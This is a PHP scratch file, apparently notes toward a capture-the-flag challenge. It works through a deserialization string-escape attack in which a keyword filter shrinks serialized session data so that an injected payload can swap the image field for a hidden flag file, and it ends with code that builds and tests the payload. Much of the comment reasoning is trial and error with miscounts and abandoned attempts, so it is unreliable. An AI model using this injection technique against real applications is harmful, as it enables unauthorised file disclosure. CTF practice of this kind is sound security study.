<?php
// Let me trace through the filtered string more carefully
// 
// Filtered: a:3:{s:4:"user";s:5:"guest";s:8:"function";s:37:"";s:3:"img"";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses:
// a:3:{ - array with 3 elements
// s:4:"user" - key 1
// s:5:"guest" - value 1
// s:8:"function" - key 2
// s:37:" - value 2
//   PHP reads 37 bytes from position after opening quote
//   Position after opening quote: " (closing quote of empty string)
//   
//   Content: ";s:3:"img"";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
//   
//   PHP reads 37 bytes: ";s:3:"img"";s:3:"img";s:20:"Z3Vlc3RfaW1nL (37 bytes)
//   
//   Let me count: ";s:3:"img"";s:3:"img";s:20:"Z3Vlc3RfaW1nL
//   
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   3 = 1
//   : = 1
//   " = 1
//   i = 1
//   m = 1
//   g = 1
//   " = 1
//   " = 1 (extra quote!)
//   ; = 1
//   s = 1
//   : = 1
//   3 = 1
//   : = 1
//   " = 1
//   i = 1
//   m = 1
//   g = 1
//   " = 1
//   ; = 1
//   s = 1
//   : = 1
//   2 = 1
//   0 = 1
//   : = 1
//   " = 1
//   Z = 1
//   3 = 1
//   V = 1
//   l = 1
//   c = 1
//   3 = 1
//   R = 1
//   f = 1
//   a = 1
//   W = 1
//   1 = 1
//   n = 1
//   L = 1
//   Total: 37 bytes
//   
//   Then PHP expects "; (closing quote and semicolon)
//   Next char: n (from "nBuZw==")
//   Expected ", got n
//   Error!

// So the 37th byte is: L (from "aW1nL")
// And the next char is: n

// We need the 37th byte to be followed by "!

// Let me find positions where " appears in the content:
// Content: ";s:3:"img"";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Position 0: "
// Position 6: "
// Position 10: "
// Position 11: " (extra quote from injection!)
// Position 17: "
// Position 21: "
// Position 38: "

// If we want the (37 + 1)th byte to be ", we need position 38 to be ".
// 
// But position 38 is: " (yes!)
// 
// So we need to read 37 bytes, and the next char should be "!
// 
// But we're reading 37 bytes, and position 37 is: L (from "aW1nL")
// Position 38 is: "
// 
// So the next char after 37 bytes is: "!
// 
// PHP reads: " (closing quote)
// Next char: ; (position 39)
// PHP reads: ; (semicolon)
// 
// PHP found "; and continues parsing!
// 
// The next chars are: nBuZw==";}
// 
// But this is not a valid KEY!

// Hmm, the issue is that after ";, the next chars are: nBuZw==";}
// 
// This is not a valid serialized element!

// Let me think about this differently.
// 
// The injection is: ";s:3:"img" (11 bytes)
// 
// After the injection, the remaining content is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// But wait, the injection includes an extra " at the end!
// 
// injection = ";s:3:"img" (11 bytes)
// 
// This includes: ";s:3:"img"
// 
// The " at position 10 is the closing quote of "img".
// 
// After the injection, the remaining content is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// But the injection already includes ";s:3:"img", which should be a KEY-VALUE pair!

// Let me trace through more carefully.
// 
// The injection is: ";s:3:"img" (11 bytes)
// 
// This is: ";s:3:"img"
// 
// The " at position 0 is a quote.
// The ; at position 1 is a semicolon.
// The s:3:"img" at positions 2-10 is a KEY.
// 
// But there's no VALUE for this KEY!
// 
// So the injection is incomplete!

// We need to include a VALUE for the img KEY!
// 
// injection = ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} (41 bytes)
// 
// This includes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// The "; at positions 0-1 closes the previous VALUE.
// The s:3:"img" at positions 2-10 is a KEY.
// The ; at position 11 separates KEY and VALUE.
// The s:20:"ZDBnM19mMWFnLnBocA==" at positions 12-37 is a VALUE.
// The "; at positions 38-39 closes the VALUE.
// The } at position 40 closes the array.

// But this is 41 bytes, and we need to generate overflow!

// Let me think about the structure:
// 
// We want PHP to read the injection as part of the VALUE of function,
// and then continue parsing the remaining content as a KEY-VALUE pair!
// 
// The injection: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// After reading the injection (41 bytes), PHP expects "; (closing quote and semicolon).
// 
// If the next char is ", PHP reads it as the closing quote.
// If the next char is ;, PHP reads it as the semicolon.
// 
// Then PHP continues parsing the remaining content.
// 
// The remaining content is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// This starts with ";, which is the closing quote and semicolon of the previous VALUE.
// 
// Then s:3:"img" is a KEY.
// Then ; separates KEY and VALUE.
// Then s:20:"Z3Vlc3RfaW1nLnBuZw==" is a VALUE.
// Then "; closes the VALUE.
// Then } closes the array.

// So after the injection, PHP should parse:
// "; (closing quote and semicolon of function VALUE)
// s:3:"img" (KEY 3)
// ; (separator)
// s:20:"Z3Vlc3RfaW1nLnBuZw==" (VALUE 3)
// "; (closing quote and semicolon)
// } (end of array)

// But the array count is 3, and we've already parsed:
// - user (KEY 1)
// - guest (VALUE 1)
// - function (KEY 2)
// - [injection] (VALUE 2)
// 
// So we've parsed 2 elements. We need 1 more element!
// 
// After the injection, PHP parses:
// - s:3:"img" (KEY 3)
// - s:20:"Z3Vlc3RfaW1nLnBuZw==" (VALUE 3)
// 
// But wait, the injection already includes s:3:"img" as a KEY!
// 
// So PHP would parse:
// - [injection] (VALUE 2)
// - s:3:"img" (KEY 3, from the remaining content)
// - s:20:"Z3Vlc3RfaW1nLnBuZw==" (VALUE 3)
// 
// But the injection includes ";s:3:"img"; which should be parsed as part of VALUE 2!

// I think the key insight is:
// The injection is read as the VALUE of function.
// After reading the VALUE, PHP expects "; (closing quote and semicolon).
// 
// If the next char is ", PHP reads it as the closing quote.
// 
// But the injection ends with }, not "!

// Let me trace through with the 41-byte injection:
// 
// injection = ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// PHP reads 41 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: " (from the remaining content ";s:3:...)
// PHP reads: " (closing quote)
// Next char: ; (from the remaining content)
// PHP reads: ; (semicolon)
// 
// PHP found "; and continues parsing!
// 
// The next chars are: s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses:
// s:3:"img" - KEY 3
// ; - separator
// s:20:"Z3Vlc3RfaW1nLnBuZw==" - VALUE 3
// "; - closing quote and semicolon
// } - end of array
// 
// So the final array is:
// user = guest
// function = ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
// img = Z3Vlc3RfaW1nLnBuZw== (from the remaining content!)

// But we want img = ZDBnM19mMWFnLnBocA== (from the injection!)

// The issue is that the injection is read as the VALUE of function,
// not as separate KEY-VALUE pairs!

// So the escape trick for SHRINKING doesn't inject new elements!

// I think I need to use a different approach.

// Let me think about this:
// What if we use the escape to consume the ENTIRE remaining structure,
// and then inject our own structure?

// The remaining structure after the function VALUE is: ";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// Length: 33 bytes
// 
// If we generate 33 bytes of overflow, PHP reads the entire remaining structure
// as part of the function VALUE.
// 
// Then PHP expects "; (closing quote and semicolon).
// 
// But there's nothing left! The string ends with }!
// 
// PHP expects ", but sees nothing!
// 
// Error!

// Unless we inject content that includes the closing quote and semicolon!

// Let me try:
// injection = ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"; (42 bytes, with extra ";)
// 
// PHP reads 42 bytes: ";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"; (42 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: s (from the remaining content s:3:...)
// Expected ", got s
// Error!

// Still doesn't work!

// Let me try yet another approach:
// What if we use the escape to inject content that closes the array early,
// and then adds our own array?

// injection = ";}a:1:{s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} (42 bytes)
// 
// PHP reads 42 bytes: ";}a:1:{s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";} (42 bytes)
// 
// Then PHP expects "; (closing quote and semicolon)
// Next char: " (from the remaining content ";s:3:...)
// PHP reads: " (closing quote)
// Next char: ; (from the remaining content)
// PHP reads: ; (semicolon)
// 
// PHP found "; and continues parsing!
// 
// The next chars are: s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// PHP parses this as KEY-VALUE pairs!

// But wait, the injection includes ";} which should close the function VALUE and the array!
// 
// But PHP reads the entire injection as the VALUE, not parsing ";} as separate!

// So the escape trick for SHRINKING doesn't work as I thought!

// I'm going to try a completely different approach:
// What if we use the user field instead of the function field?

// The user field is the FIRST element in the array.
// If we can inject content from the user field, we might be able to control the entire array!

// Let me try:
// user = 'flag' + injection
// injection = ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
// 
// PHP reads the injection as the VALUE of user.
// 
// After reading the VALUE, PHP expects "; (closing quote and semicolon).
// 
// If the next char is ", PHP reads it as the closing quote.
// 
// Then PHP continues parsing the remaining content.

// Let me test this!

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}

// Test with user field
$injection = '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}';

// We need to generate overflow to reach the right position
// 
// The injection is 66 bytes.
// After the injection, the remaining content is: ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
// 
// We want the (66 + X + 1)th byte to be "!

// Let me find positions where " appears in the remaining content:
$remaining = '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}';
echo "Remaining content: $remaining\n";
echo "Positions of \":\n";
for ($i = 0; $i < strlen($remaining); $i++) {
    if ($remaining[$i] === '"') {
        echo "Position $i: \"\n";
    }
}
echo "\n";

// Positions of ": 0, 8, 19, 26, 30, 47, 72
// 
// We want 66 + X + 1 = 0, 8, 19, 26, 30, 47, or 72
// 
// 66 + X + 1 = 0 => X = -67 (invalid)
// 66 + X + 1 = 8 => X = -59 (invalid)
// 66 + X + 1 = 19 => X = -48 (invalid)
// 66 + X + 1 = 26 => X = -41 (invalid)
// 66 + X + 1 = 30 => X = -37 (invalid)
// 66 + X + 1 = 47 => X = -20 (invalid)
// 66 + X + 1 = 72 => X = 5 (valid!)

// So we need X = 5 bytes of overflow!
// 
// 5 = 4 + 1 (can't generate 1 byte)
// 5 = 3 + 2 (can't generate 2 bytes)
// 
// Hmm, we can't generate exactly 5 bytes!

// Let me try a different injection length.

// What if we use a shorter injection?
// 
// injection = ";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA=="; (65 bytes, missing the last })
// 
// Then 65 + X + 1 = 72 => X = 6 (valid!)
// 
// 6 = 3 * 2 (2 'php's)
// 
// So we need 2 'php's!

// Let me test this:
$flags = 0;
$phps = 2;
$overflow = 4 * $flags + 3 * $phps;

echo "=== Testing overflow=$overflow (flags=$flags, phps=$phps) ===\n";

$injection = '";s:8:"function";s:10:"show_image";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";';
$payload = str_repeat('flag', $flags) . str_repeat('php', $phps) . $injection;

$_SESSION = [];
$_SESSION['user'] = $payload;
$_SESSION['function'] = 'show_image';
$_SESSION['img'] = 'Z3Vlc3RfaW1nLnBuZw==';

$serialized = serialize($_SESSION);
echo "Serialized:\n";
echo $serialized . "\n\n";

$filtered = filter($serialized);
echo "Filtered:\n";
echo $filtered . "\n\n";

$result = @unserialize($filtered);
echo "Unserialized:\n";
var_dump($result);
echo "\n";

